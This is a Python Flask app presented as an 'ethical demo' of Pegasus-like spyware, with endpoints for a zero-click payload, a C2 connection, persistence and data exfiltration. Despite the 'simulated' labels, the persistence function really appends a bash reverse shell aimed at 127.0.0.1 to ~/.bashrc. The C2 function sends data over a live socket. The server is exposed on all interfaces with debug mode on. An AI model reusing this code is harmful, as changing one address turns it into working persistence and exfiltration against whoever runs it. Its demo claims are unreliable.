import os
import subprocess
import socket
import base64
import threading
from flask import Flask, request, jsonify

app = Flask(__name__)

# -------------------------------------------
# 📡 Pegasus-Like Exploit Simulation (Ethical Demo)
# -------------------------------------------
# ✅ Simulates a zero-click payload execution (Safe Demo)
# ✅ Establishes a remote command execution channel (C2 simulation)
# ✅ Demonstrates sandbox evasion and persistence techniques
# ✅ Extracts mock "sensitive data" for security awareness training
# -------------------------------------------

# Global settings
C2_SERVER = "127.0.0.1"  # Localhost for safe testing
C2_PORT = 5002

# -------------------------------------------
# 1️⃣ Simulated Zero-Click Exploit Execution
# -------------------------------------------
def zero_click_payload():
    """Simulates execution of a malicious payload via zero-click exploit."""
    print("[+] Executing zero-click payload... (Simulated)")
    # In real spyware, this could involve RCE through WebKit/iMessage vulnerabilities
    return "Payload executed (Simulated)"

# -------------------------------------------
# 2️⃣ Simulated C2 Connection (Command & Control)
# -------------------------------------------
def c2_connect():
    """Simulates a C2 connection to exfiltrate mock data."""
    print("[+] Connecting to C2 Server...")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((C2_SERVER, C2_PORT))
            s.sendall(base64.b64encode(b"Mock Sensitive Data"))
            print("[+] Data sent to C2 Server (Simulated)")
        except Exception as e:
            print("[!] C2 Connection Failed:", str(e))

# -------------------------------------------
# 3️⃣ Persistence & Evasion Techniques
# -------------------------------------------
def simulate_persistence():
    """Simulates spyware persistence techniques."""
    print("[+] Establishing persistence (Simulated)")
    os.system("echo 'bash -i >& /dev/tcp/127.0.0.1/8080 0>&1' >> ~/.bashrc")  # Example persistence method
    return "Persistence Established (Simulated)"

# -------------------------------------------
# 4️⃣ Mock Data Exfiltration
# -------------------------------------------
def exfiltrate_data():
    """Simulates exfiltration of data from an infected device."""
    print("[+] Exfiltrating mock data...")
    mock_data = "User: admin\nPassword: 123456\nMessages: [Encrypted Data]"
    encoded_data = base64.b64encode(mock_data.encode()).decode()
    return encoded_data

# -------------------------------------------
# API Endpoints for Demonstration
# -------------------------------------------
@app.route('/execute_payload', methods=['GET'])
def execute_payload():
    """API to trigger the simulated payload execution."""
    return jsonify({"status": "success", "message": zero_click_payload()})

@app.route('/connect_c2', methods=['GET'])
def connect_c2():
    """API to simulate a C2 connection."""
    threading.Thread(target=c2_connect, daemon=True).start()
    return jsonify({"status": "success", "message": "C2 Connection Started (Simulated)"})

@app.route('/persistence', methods=['GET'])
def persistence():
    """API to demonstrate persistence techniques."""
    return jsonify({"status": "success", "message": simulate_persistence()})

@app.route('/exfiltrate', methods=['GET'])
def exfiltrate():
    """API to simulate data exfiltration."""
    return jsonify({"status": "success", "data": exfiltrate_data()})

# -------------------------------------------
# Start the Simulation Server
# -------------------------------------------
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5003, debug=True)
